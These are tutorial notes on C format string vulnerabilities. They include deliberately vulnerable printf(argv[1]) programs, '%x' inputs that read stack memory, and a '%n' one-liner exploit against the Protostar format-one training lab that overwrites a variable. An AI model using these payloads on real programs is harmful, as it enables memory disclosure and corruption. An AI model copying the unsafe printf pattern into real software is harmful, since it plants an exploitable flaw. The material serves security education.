# Format String Bug

Some notes on what a format string bug is and how it looks like in real life.

## Overview

Format String bug appears in programs written in C, which means this bug is applicable to all operating systems that have a C compiler, or in other words - most of OSes.

## What is Format String?

> **printf format string** refers to a control parameter used by a class of [functions](https://en.wikipedia.org/wiki/Function\_\(computer\_science\)) in the input/output libraries of [C](https://en.wikipedia.org/wiki/C\_\(programming\_language\)) and many other [programming languages](https://en.wikipedia.org/wiki/Programming\_languages). The string is written in a simple [template language](https://en.wikipedia.org/wiki/Template\_language): characters are usually copied literally into the function's output, but **format specifiers**, which start with a [`%`](https://en.wikipedia.org/wiki/Percent\_sign) character, indicate the location and method to translate a piece of data (such as a number) to characters.\
> [\
> https://en.wikipedia.org/wiki/Printf\_format\_string](https://en.wikipedia.org/wiki/Printf\_format\_string)

In other words, format string allows the programmer to specify how a certain value, say a floating-point number such as money savings, should be printed to the screen.

Let's look at the below code example, where the `savings` variable is defined as a floating value of `345.82`, which is printed to the screen with `printf`, using the format string `Savings: $%f`:

{% hint style="info" %}
The `%f` in the format string tells the `printf()` to print the value of `savings` as a floating-point value.
{% endhint %}

{% code title="fmt-00.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
        double savings = 345.82;
        
        // The first argument is the format string.
        // It tells printf to print the value of savings as a floating value.
        printf("Savings: $%f", savings);
        return 0;
}
```
{% endcode %}

Let's compile, run the code and observe the result:

```
gcc .\fmt-00.c -o fmt-00.exe; .\fmt-00.exe
```

...we can see that the `savings` value was printed with 6 decimal places:

![](<../../../.gitbook/assets/image (1076).png>)

However, `$345.820000` is not the precision we need when dealing with money, so it would look better if the value only had 2 decimal places, such as `$345.82`. With the help of format string `Savings: $%.2f`, we can achieve exactly that:

![](<../../../.gitbook/assets/image (1077).png>)

## What is Format String Bug?

Programs become vulnerable to the format string bug when user supplied data is included in the format string the program uses to display the data when in print functions such as (not limited to):

```c
printf
fprintf
sprintf
snprintf
...
```

## Memory Read

Format string vulnerabilities make it possible to read stack memory of the vulnerable program.

Let's look at the sample code provided below, that takes in the user supplied argument 1 and uses it in inside the function `printf`, which means that the user's supplied string is used as a format string for the <mark style="color:blue;">`printf`</mark> function:

{% code title="fmt.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
        if( argc != 2 )
        {
                printf("Error - supply a format string please\n");
                return 1;
        }

        printf( argv[1] );
        printf( "\n" );

        return 0;
}
```
{% endcode %}

Let's compile and run the program without feeding it any strings first:

```
gcc .\fmt.c -o fmt.exe; .\fmt.exe
```

![](<../../../.gitbook/assets/image (1078).png>)

Let's now supply a string format, say `Testing: 0x%x`:

```
gcc .\fmt.c -o fmt.exe; .\fmt.exe "Testing: 0x%x"
```

![](<../../../.gitbook/assets/image (1081).png>)

Considering the fact that the format string is supplied, but the corresponding variable is not (which would be provided in the program written by a programmer, however in our case we are supplying the format string to the program via a commandline argument without associated variables), the program simply **starts reading values from the stack memory**. Note that there is nothing preventing us from reading even multiple values from the stack too:

```
gcc .\fmt.c -o fmt.exe; .\fmt.exe "Reading stack memory: 0x%x 0x%x 0x%x 0x%x"
```

![](<../../../.gitbook/assets/image (1080).png>)

The above example illustrates how it may be possible to abuse this bug to read program's stack memory, which may reveal some sensitive information, such as authentication passwords.

## Memory Write

Format string vulnerabilities make it possible to write to arbitrary memory locations inside the vulnerable program.

To see this in action, we're going to use the following purposely vulnerable code from:

{% embed url="https://exploit.education/protostar/format-one" %}

```cpp
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

```
./format1 "` python -c "print 'AAAA' + 'x38\x96\x04\x08' + 'BBBBBBBBBBBBBBBBBBBBBB' + '%x '*128 " `"; echo
```

### Exploit

```
./format1 "` python -c "print 'AAAA' + 'x38\x96\x04\x08' + 'BBBBBBBBBBBBBBBBBBBBBB' + '%x '*127 + '%n ' " `"; echo
```

{% hint style="info" %}
It's possible to abuse format bugs to execute shellcode, but I could not get my dev environment setup to reproduce the exploitation examples found in the book and online, so these notes are parked for the time being.
{% endhint %}

## References

{% embed url="https://www.wiley.com/en-gb/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238" %}

[https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)
